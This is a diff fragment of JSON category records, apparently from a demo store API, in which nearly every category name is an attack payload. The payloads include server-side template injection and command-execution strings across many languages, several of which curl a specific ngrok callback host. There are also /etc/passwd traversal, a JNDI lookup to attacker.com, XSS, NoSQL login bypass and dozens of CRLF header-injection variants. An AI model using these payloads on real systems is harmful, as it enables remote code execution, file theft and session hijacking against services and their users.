+        "slug": "class-mro-2-subclasses-40-etc-passwd-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:45.000Z",
+        "updatedAt": "2026-03-17T16:07:45.000Z"
+    },
+    {
+        "id": 611,
+        "name": "require('child_process').exec('id')",
+        "slug": "require-child-process-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:46.000Z",
+        "updatedAt": "2026-03-17T16:07:46.000Z"
+    },
+    {
+        "id": 612,
+        "name": "require('child_process').execSync('id')",
+        "slug": "require-child-process-execsync-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:46.000Z",
+        "updatedAt": "2026-03-17T16:07:46.000Z"
+    },
+    {
+        "id": 613,
+        "name": "require('child_process').spawn('id')",
+        "slug": "require-child-process-spawn-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:46.000Z",
+        "updatedAt": "2026-03-17T16:07:46.000Z"
+    },
+    {
+        "id": 614,
+        "name": "process.mainModule.require('child_process').exec('id')",
+        "slug": "process-mainmodule-require-child-process-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:47.000Z",
+        "updatedAt": "2026-03-17T16:07:47.000Z"
+    },
+    {
+        "id": 615,
+        "name": "global.process.mainModule.require('child_process').exec('id')",
+        "slug": "global-process-mainmodule-require-child-process-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:47.000Z",
+        "updatedAt": "2026-03-17T16:07:47.000Z"
+    },
+    {
+        "id": 616,
+        "name": "this.constructor.constructor('return process')().mainModule.require('child_process').exec('id')",
+        "slug": "this-constructor-constructor-return-process-mainmodule-require-child-process-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:48.000Z",
+        "updatedAt": "2026-03-17T16:07:48.000Z"
+    },
+    {
+        "id": 617,
+        "name": "Runtime.getRuntime().exec('id')",
+        "slug": "runtime-getruntime-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:48.000Z",
+        "updatedAt": "2026-03-17T16:07:48.000Z"
+    },
+    {
+        "id": 618,
+        "name": "new ProcessBuilder(['id']).start()",
+        "slug": "new-processbuilder-id-start",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:48.000Z",
+        "updatedAt": "2026-03-17T16:07:48.000Z"
+    },
+    {
+        "id": 619,
+        "name": "T(java.lang.Runtime).getRuntime().exec('id')",
+        "slug": "t-java-lang-runtime-getruntime-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:49.000Z",
+        "updatedAt": "2026-03-17T16:07:49.000Z"
+    },
+    {
+        "id": 620,
+        "name": "System.Diagnostics.Process.Start('cmd.exe', '/c id')",
+        "slug": "system-diagnostics-process-start-cmd-exe-c-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:50.000Z",
+        "updatedAt": "2026-03-17T16:07:50.000Z"
+    },
+    {
+        "id": 621,
+        "name": "new System.Diagnostics.ProcessStartInfo('cmd.exe', '/c id')",
+        "slug": "new-system-diagnostics-processstartinfo-cmd-exe-c-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:50.000Z",
+        "updatedAt": "2026-03-17T16:07:50.000Z"
+    },
+    {
+        "id": 622,
+        "name": "system('id')",
+        "slug": "system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:51.000Z",
+        "updatedAt": "2026-03-17T16:07:51.000Z"
+    },
+    {
+        "id": 623,
+        "name": "exec('id')",
+        "slug": "exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:52.000Z",
+        "updatedAt": "2026-03-17T16:07:52.000Z"
+    },
+    {
+        "id": 624,
+        "name": "%x(id)",
+        "slug": "x-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:52.000Z",
+        "updatedAt": "2026-03-17T16:07:52.000Z"
+    },
+    {
+        "id": 625,
+        "name": "IO.popen('id').read",
+        "slug": "io-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:53.000Z",
+        "updatedAt": "2026-03-17T16:07:53.000Z"
+    },
+    {
+        "id": 626,
+        "name": "Open3.capture3('id')",
+        "slug": "open3-capture3-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:53.000Z",
+        "updatedAt": "2026-03-17T16:07:53.000Z"
+    },
+    {
+        "id": 627,
+        "name": "Kernel.system('id')",
+        "slug": "kernel-system-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:53.000Z",
+        "updatedAt": "2026-03-17T16:07:53.000Z"
+    },
+    {
+        "id": 628,
+        "name": "eval('`id`')",
+        "slug": "eval-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:54.000Z",
+        "updatedAt": "2026-03-17T16:07:54.000Z"
+    },
+    {
+        "id": 629,
+        "name": "os.execute('id')",
+        "slug": "os-execute-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:54.000Z",
+        "updatedAt": "2026-03-17T16:07:54.000Z"
+    },
+    {
+        "id": 630,
+        "name": "io.popen('id'):read('*a')",
+        "slug": "io-popen-id-read-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:54.000Z",
+        "updatedAt": "2026-03-17T16:07:54.000Z"
+    },
+    {
+        "id": 631,
+        "name": "loadstring('os.execute(\"id\")')",
+        "slug": "loadstring-os-execute-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:07:55.000Z",
+        "updatedAt": "2026-03-17T16:07:55.000Z"
+    },
+    {
+        "id": 632,
+        "name": "test%0d%0a%0d%0aX-Injected:header: injected",
+        "slug": "test-0d-0a-0d-0ax-injected-header-injected",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:11:27.000Z",
+        "updatedAt": "2026-03-17T16:11:27.000Z"
+    },
+    {
+        "id": 633,
+        "name": "../../../etc/passwd",
+        "slug": "etc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:26.000Z",
+        "updatedAt": "2026-03-17T16:17:26.000Z"
+    },
+    {
+        "id": 634,
+        "name": "..%2f..%2f..%2fetc/passwd",
+        "slug": "2f-2f-2fetc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:31.000Z",
+        "updatedAt": "2026-03-17T16:17:31.000Z"
+    },
+    {
+        "id": 635,
+        "name": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
+        "slug": "2e-2e-2f-2e-2e-2f-2e-2e-2fetc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:31.000Z",
+        "updatedAt": "2026-03-17T16:17:31.000Z"
+    },
+    {
+        "id": 636,
+        "name": "..%252f..%252f..%252fetc/passwd",
+        "slug": "252f-252f-252fetc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:31.000Z",
+        "updatedAt": "2026-03-17T16:17:31.000Z"
+    },
+    {
+        "id": 637,
+        "name": "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "slug": "c0-af-c0-af-c0-afetc-passwd",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:32.000Z",
+        "updatedAt": "2026-03-17T16:17:32.000Z"
+    },
+    {
+        "id": 638,
+        "name": "..%255c..%255c..%255cwindows/win.ini",
+        "slug": "255c-255c-255cwindows-win-ini",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T16:17:32.000Z",
+        "updatedAt": "2026-03-17T16:17:32.000Z"
+    },
+    {
+        "id": 639,
+        "name": "New category",
+        "slug": "new-category",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:32:11.000Z",
+        "updatedAt": "2026-03-17T17:32:11.000Z"
+    },
+    {
+        "id": 640,
+        "name": "${jndi:rmi://attacker.com/a}",
+        "slug": "jndi-rmi-attacker-com-a",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:33:29.000Z",
+        "updatedAt": "2026-03-17T17:33:29.000Z"
+    },
+    {
+        "id": 641,
+        "name": "<svg><style><img src=x onerror=alert('mxss04f2c6b6')>",
+        "slug": "svg-style-img-src-x-onerror-alert-mxss04f2c6b6",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:06.000Z",
+        "updatedAt": "2026-03-17T17:35:06.000Z"
+    },
+    {
+        "id": 643,
+        "name": "{{config}}",
+        "slug": "config",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:26.000Z",
+        "updatedAt": "2026-03-17T17:35:26.000Z"
+    },
+    {
+        "id": 644,
+        "name": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "slug": "config-class-init-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:26.000Z",
+        "updatedAt": "2026-03-17T17:35:26.000Z"
+    },
+    {
+        "id": 645,
+        "name": "{{''.__class__.__mro__[2].__subclasses__()}}",
+        "slug": "class-mro-2-subclasses",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:26.000Z",
+        "updatedAt": "2026-03-17T17:35:26.000Z"
+    },
+    {
+        "id": 646,
+        "name": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "slug": "request-application-globals-builtins-import-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:27.000Z",
+        "updatedAt": "2026-03-17T17:35:27.000Z"
+    },
+    {
+        "id": 647,
+        "name": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "slug": "cycler-init-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:27.000Z",
+        "updatedAt": "2026-03-17T17:35:27.000Z"
+    },
+    {
+        "id": 648,
+        "name": "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+        "slug": "joiner-init-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:28.000Z",
+        "updatedAt": "2026-03-17T17:35:28.000Z"
+    },
+    {
+        "id": 649,
+        "name": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "slug": "assign-ex-freemarker-template-utility-execute-new-ex-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:29.000Z",
+        "updatedAt": "2026-03-17T17:35:29.000Z"
+    },
+    {
+        "id": 650,
+        "name": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "slug": "freemarker-template-utility-execute-new-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:29.000Z",
+        "updatedAt": "2026-03-17T17:35:29.000Z"
+    },
+    {
+        "id": 651,
+        "name": "${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}",
+        "slug": "rt-java-lang-runtime-getruntime-rt-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:32.000Z",
+        "updatedAt": "2026-03-17T17:35:32.000Z"
+    },
+    {
+        "id": 652,
+        "name": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+        "slug": "set-x-set-rt-x-class-forname-java-lang-runtime-set-chr-x-class-forname-java-lang-character-set-str-x-class-forname-java-lang-string-set-ex-rt-getruntime-exec-id-ex-waitfor-set-out-ex-getinputstream-foreach-i-in-1-out-available-str-valueof-chr-tochars-out-read-end",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:32.000Z",
+        "updatedAt": "2026-03-17T17:35:32.000Z"
+    },
+    {
+        "id": 653,
+        "name": "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
+        "slug": "class-inspect-java-lang-runtime-type-getruntime-exec-id",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:32.000Z",
+        "updatedAt": "2026-03-17T17:35:32.000Z"
+    },
+    {
+        "id": 654,
+        "name": "{{self.__init__.__globals__.__builtins__['eval']('__import__(\"os\").popen(\"id\").read()')}}",
+        "slug": "self-init-globals-builtins-eval-import-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:34.000Z",
+        "updatedAt": "2026-03-17T17:35:34.000Z"
+    },
+    {
+        "id": 655,
+        "name": "{{lipsum.__globals__.os.popen('id').read()}}",
+        "slug": "lipsum-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:35.000Z",
+        "updatedAt": "2026-03-17T17:35:35.000Z"
+    },
+    {
+        "id": 656,
+        "name": "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+        "slug": "namespace-init-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:35.000Z",
+        "updatedAt": "2026-03-17T17:35:35.000Z"
+    },
+    {
+        "id": 657,
+        "name": "{{url_for.__globals__['os'].popen('id').read()}}",
+        "slug": "url-for-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:36.000Z",
+        "updatedAt": "2026-03-17T17:35:36.000Z"
+    },
+    {
+        "id": 658,
+        "name": "{{get_flashed_messages.__globals__['os'].popen('id').read()}}",
+        "slug": "get-flashed-messages-globals-os-popen-id-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:36.000Z",
+        "updatedAt": "2026-03-17T17:35:36.000Z"
+    },
+    {
+        "id": 659,
+        "name": "{{191*53}}",
+        "slug": "191-53",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:36.000Z",
+        "updatedAt": "2026-03-17T17:35:36.000Z"
+    },
+    {
+        "id": 660,
+        "name": "{{3847*2963}}",
+        "slug": "3847-2963",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:37.000Z",
+        "updatedAt": "2026-03-17T17:35:37.000Z"
+    },
+    {
+        "id": 661,
+        "name": "a]{{7*7}}",
+        "slug": "a-7-7",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:39.000Z",
+        "updatedAt": "2026-03-17T17:35:39.000Z"
+    },
+    {
+        "id": 662,
+        "name": "{{dump(app)}}",
+        "slug": "dump-app",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:40.000Z",
+        "updatedAt": "2026-03-17T17:35:40.000Z"
+    },
+    {
+        "id": 663,
+        "name": "{% import os %}{{ os.popen(\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/8c63613ec2fa8cf2c8ba/ssti\").read() }}",
+        "slug": "import-os-os-popen-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-8c63613ec2fa8cf2c8ba-ssti-read",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:44.000Z",
+        "updatedAt": "2026-03-17T17:35:44.000Z"
+    },
+    {
+        "id": 664,
+        "name": "${\"https://uncloyed-eden-soughfully.ngrok-free.dev/i/8c63613ec2fa8cf2c8ba/ssti\"?url?content}",
+        "slug": "https-uncloyed-eden-soughfully-ngrok-free-dev-i-8c63613ec2fa8cf2c8ba-ssti-url-content",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:44.000Z",
+        "updatedAt": "2026-03-17T17:35:44.000Z"
+    },
+    {
+        "id": 665,
+        "name": "#set($x=\"\")#set($rt=$x.class.forName(\"java.lang.Runtime\"))#set($chr=$x.class.forName(\"java.lang.Character\"))#set($str=$x.class.forName(\"java.lang.String\"))#set($ex=$rt.getRuntime().exec(\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/8c63613ec2fa8cf2c8ba/ssti\"))$ex.waitFor()",
+        "slug": "set-x-set-rt-x-class-forname-java-lang-runtime-set-chr-x-class-forname-java-lang-character-set-str-x-class-forname-java-lang-string-set-ex-rt-getruntime-exec-curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-8c63613ec2fa8cf2c8ba-ssti-ex-waitfor",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:44.000Z",
+        "updatedAt": "2026-03-17T17:35:44.000Z"
+    },
+    {
+        "id": 666,
+        "name": "{{[\"curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/8c63613ec2fa8cf2c8ba/ssti\"]|filter(\"system\")}}",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-8c63613ec2fa8cf2c8ba-ssti-filter-system",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:45.000Z",
+        "updatedAt": "2026-03-17T17:35:45.000Z"
+    },
+    {
+        "id": 667,
+        "name": "<%= `curl https://uncloyed-eden-soughfully.ngrok-free.dev/i/8c63613ec2fa8cf2c8ba/ssti` %>",
+        "slug": "curl-https-uncloyed-eden-soughfully-ngrok-free-dev-i-8c63613ec2fa8cf2c8ba-ssti",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:35:45.000Z",
+        "updatedAt": "2026-03-17T17:35:45.000Z"
+    },
+    {
+        "id": 668,
+        "name": "test\\r\\nSet-Cookie:pwned=1",
+        "slug": "test-r-nset-cookie-pwned-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:02.000Z",
+        "updatedAt": "2026-03-17T17:36:02.000Z"
+    },
+    {
+        "id": 669,
+        "name": "test%E5%98%8A%E5%98%8DSet-Cookie:test=1",
+        "slug": "test-e5-98-8a-e5-98-8dset-cookie-test-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:03.000Z",
+        "updatedAt": "2026-03-17T17:36:03.000Z"
+    },
+    {
+        "id": 670,
+        "name": "test%0d%0aLocation:https://attacker.com",
+        "slug": "test-0d-0alocation-https-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:03.000Z",
+        "updatedAt": "2026-03-17T17:36:03.000Z"
+    },
+    {
+        "id": 671,
+        "name": "testX-Forwarded-For: 127.0.0.1",
+        "slug": "testx-forwarded-for-127-0-0-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:03.000Z",
+        "updatedAt": "2026-03-17T17:36:03.000Z"
+    },
+    {
+        "id": 672,
+        "name": "testX-Forwarded-Host: attacker.com",
+        "slug": "testx-forwarded-host-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:04.000Z",
+        "updatedAt": "2026-03-17T17:36:04.000Z"
+    },
+    {
+        "id": 673,
+        "name": "testX-Original-URL: /admin",
+        "slug": "testx-original-url-admin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:04.000Z",
+        "updatedAt": "2026-03-17T17:36:04.000Z"
+    },
+    {
+        "id": 675,
+        "name": "testHost: attacker.com",
+        "slug": "testhost-attacker-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:04.000Z",
+        "updatedAt": "2026-03-17T17:36:04.000Z"
+    },
+    {
+        "id": 676,
+        "name": "test%0d%0aAccess-Control-Allow-Origin:*",
+        "slug": "test-0d-0aaccess-control-allow-origin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:05.000Z",
+        "updatedAt": "2026-03-17T17:36:05.000Z"
+    },
+    {
+        "id": 677,
+        "name": "testX-HTTP-Method-Override: DELETE",
+        "slug": "testx-http-method-override-delete",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:05.000Z",
+        "updatedAt": "2026-03-17T17:36:05.000Z"
+    },
+    {
+        "id": 678,
+        "name": "test%0d%0aTransfer-Encoding:chunked",
+        "slug": "test-0d-0atransfer-encoding-chunked",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:05.000Z",
+        "updatedAt": "2026-03-17T17:36:05.000Z"
+    },
+    {
+        "id": 679,
+        "name": "test/%%0a0aSet-Cookie:crlf=injection",
+        "slug": "test-0a0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:06.000Z",
+        "updatedAt": "2026-03-17T17:36:06.000Z"
+    },
+    {
+        "id": 680,
+        "name": "test/%0aSet-Cookie:crlf=injection",
+        "slug": "test-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:06.000Z",
+        "updatedAt": "2026-03-17T17:36:06.000Z"
+    },
+    {
+        "id": 681,
+        "name": "test/%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:07.000Z",
+        "updatedAt": "2026-03-17T17:36:07.000Z"
+    },
+    {
+        "id": 682,
+        "name": "test/%0dSet-Cookie:crlf=injection",
+        "slug": "test-0dset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:08.000Z",
+        "updatedAt": "2026-03-17T17:36:08.000Z"
+    },
+    {
+        "id": 683,
+        "name": "test/%23%0aSet-Cookie:crlf=injection",
+        "slug": "test-23-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:08.000Z",
+        "updatedAt": "2026-03-17T17:36:08.000Z"
+    },
+    {
+        "id": 684,
+        "name": "test/%23%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-23-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:08.000Z",
+        "updatedAt": "2026-03-17T17:36:08.000Z"
+    },
+    {
+        "id": 685,
+        "name": "username[$ne]=admin&password[$ne]=",
+        "slug": "username-ne-admin-password-ne",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:09.000Z",
+        "updatedAt": "2026-03-17T17:36:09.000Z"
+    },
+    {
+        "id": 686,
+        "name": "test/%23%0dSet-Cookie:crlf=injection",
+        "slug": "test-23-0dset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:09.000Z",
+        "updatedAt": "2026-03-17T17:36:09.000Z"
+    },
+    {
+        "id": 687,
+        "name": "test/%25%30%61Set-Cookie:crlf=injection",
+        "slug": "test-25-30-61set-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:09.000Z",
+        "updatedAt": "2026-03-17T17:36:09.000Z"
+    },
+    {
+        "id": 688,
+        "name": "test/%25%30aSet-Cookie:crlf=injection",
+        "slug": "test-25-30aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:09.000Z",
+        "updatedAt": "2026-03-17T17:36:09.000Z"
+    },
+    {
+        "id": 689,
+        "name": "test/%250aSet-Cookie:crlf=injection",
+        "slug": "test-250aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:10.000Z",
+        "updatedAt": "2026-03-17T17:36:10.000Z"
+    },
+    {
+        "id": 690,
+        "name": "test/%25250aSet-Cookie:crlf=injection",
+        "slug": "test-25250aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:11.000Z",
+        "updatedAt": "2026-03-17T17:36:11.000Z"
+    },
+    {
+        "id": 691,
+        "name": "test/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-2e-2e-2f-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:11.000Z",
+        "updatedAt": "2026-03-17T17:36:11.000Z"
+    },
+    {
+        "id": 692,
+        "name": "test/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-2f-2e-2e-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:11.000Z",
+        "updatedAt": "2026-03-17T17:36:11.000Z"
+    },
+    {
+        "id": 693,
+        "name": "test/%2F..%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-2f-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:12.000Z",
+        "updatedAt": "2026-03-17T17:36:12.000Z"
+    },
+    {
+        "id": 694,
+        "name": "test/%3f%0d%0aSet-Cookie:crlf=injection",
+        "slug": "test-3f-0d-0aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:12.000Z",
+        "updatedAt": "2026-03-17T17:36:12.000Z"
+    },
+    {
+        "id": 695,
+        "name": "test/%3f%0dSet-Cookie:crlf=injection",
+        "slug": "test-3f-0dset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:13.000Z",
+        "updatedAt": "2026-03-17T17:36:13.000Z"
+    },
+    {
+        "id": 696,
+        "name": "test/%u000aSet-Cookie:crlf=injection",
+        "slug": "test-u000aset-cookie-crlf-injection",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:13.000Z",
+        "updatedAt": "2026-03-17T17:36:13.000Z"
+    },
+    {
+        "id": 697,
+        "name": "testHost: evil.com",
+        "slug": "testhost-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:13.000Z",
+        "updatedAt": "2026-03-17T17:36:13.000Z"
+    },
+    {
+        "id": 698,
+        "name": "testX-Forwarded-Host: evil.com",
+        "slug": "testx-forwarded-host-evil-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:14.000Z",
+        "updatedAt": "2026-03-17T17:36:14.000Z"
+    },
+    {
+        "id": 699,
+        "name": "testX-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: evil",
+        "slug": "testx-forwarded-for-127-0-0-1-x-injected-header-evil",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:14.000Z",
+        "updatedAt": "2026-03-17T17:36:14.000Z"
+    },
+    {
+        "id": 700,
+        "name": "testReferer: javascript:alert(1)",
+        "slug": "testreferer-javascript-alert-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:15.000Z",
+        "updatedAt": "2026-03-17T17:36:15.000Z"
+    },
+    {
+        "id": 701,
+        "name": "testUser-Agent: <script>alert(1)</script>",
+        "slug": "testuser-agent-script-alert-1-script",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:15.000Z",
+        "updatedAt": "2026-03-17T17:36:15.000Z"
+    },
+    {
+        "id": 702,
+        "name": "testX-Original-URL: /admin/dashboard",
+        "slug": "testx-original-url-admin-dashboard",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:15.000Z",
+        "updatedAt": "2026-03-17T17:36:15.000Z"
+    },
+    {
+        "id": 703,
+        "name": "testX-Rewrite-URL: /admin",
+        "slug": "testx-rewrite-url-admin",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:16.000Z",
+        "updatedAt": "2026-03-17T17:36:16.000Z"
+    },
+    {
+        "id": 704,
+        "name": "testX-Custom-IP-Authorization: 127.0.0.1",
+        "slug": "testx-custom-ip-authorization-127-0-0-1",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:16.000Z",
+        "updatedAt": "2026-03-17T17:36:16.000Z"
+    },
+    {
+        "id": 705,
+        "name": "testHost: localhost\r\nHost: target.com",
+        "slug": "testhost-localhost-host-target-com",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:17.000Z",
+        "updatedAt": "2026-03-17T17:36:17.000Z"
+    },
+    {
+        "id": 706,
+        "name": "testX-Forwarded-Proto: http",
+        "slug": "testx-forwarded-proto-http",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:17.000Z",
+        "updatedAt": "2026-03-17T17:36:17.000Z"
+    },
+    {
+        "id": 707,
+        "name": "testConnection: keep-alive\r\nTransfer-Encoding: chunked",
+        "slug": "testconnection-keep-alive-transfer-encoding-chunked",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:17.000Z",
+        "updatedAt": "2026-03-17T17:36:17.000Z"
+    },
+    {
+        "id": 708,
+        "name": "testAccept-Language: en\r\nSet-Cookie: admin=true",
+        "slug": "testaccept-language-en-set-cookie-admin-true",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:18.000Z",
+        "updatedAt": "2026-03-17T17:36:18.000Z"
+    },
+    {
+        "id": 709,
+        "name": "testX-Debug: true",
+        "slug": "testx-debug-true",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:18.000Z",
+        "updatedAt": "2026-03-17T17:36:18.000Z"
+    },
+    {
+        "id": 710,
+        "name": "testX-Forwarded-Port: 443\r\nX-Forwarded-Scheme: https",
+        "slug": "testx-forwarded-port-443-x-forwarded-scheme-https",
+        "image": "https://placehold.co/600x400",
+        "creationAt": "2026-03-17T17:36:19.000Z",
